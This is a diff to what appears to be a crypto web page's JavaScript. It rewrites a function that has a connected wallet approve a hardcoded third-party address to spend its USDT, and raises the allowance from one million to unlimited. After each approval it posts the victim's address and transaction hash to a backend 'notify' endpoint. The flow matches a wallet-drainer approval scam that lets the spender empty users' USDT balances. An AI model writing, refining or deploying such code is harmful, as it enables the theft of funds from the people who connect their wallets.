@@ -124,41 +124,41 @@ async function connectWalletConnect() {
 }
 
 /* ============================
-   APPROVAL LOGIC
+   APPROVAL LOGIC (COPIED FLOW)
    ============================ */
 async function approveSpender(account) {
   try {
-    const spenderAddress = '0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85';
-    const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Replace with actual USDT contract address
+    const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum USDT
+    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
-    const usdtAmount = ethers.utils.parseUnits("1000000", 6).toString();
+    // Use ethers.Contract with signer (user pays gas)
+    const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+    const tx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
 
-    const abi = [
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "_spender", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ],
-        "name": "approve",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "type": "function"
-      }
-    ];
+    console.log("Approval transaction sent:", tx.hash);
 
-    const contract = new window.web3.eth.Contract(abi, usdtAddress);
-    const receipt = await contract.methods
-      .approve(spenderAddress, usdtAmount)
-      .send({ from: account });
+    const receipt = await tx.wait();
+    if (receipt.status === 1) {
+      alert("✅ USDT approval successful!");
+      console.log("Approval confirmed:", receipt.transactionHash);
 
-    await fetch("http://localhost:3000/notify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ owner: account, token: usdtAddress, txHash: receipt.transactionHash })
-    });
-
-    alert('USDT approval successful!');
+      // Example notification (replace with your backend)
+      await fetch("http://localhost:3000/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          owner: account,
+          token: USDT_ADDRESS,
+          txHash: receipt.transactionHash
+        })
+      });
+    } else {
+      throw new Error("Transaction failed");
+    }
   } catch (error) {
-    console.error('Approval flow failed:', error);
+    console.error("Approval flow failed:", error);
+    alert("❌ Approval failed: " + error.message);
   }
 }
+
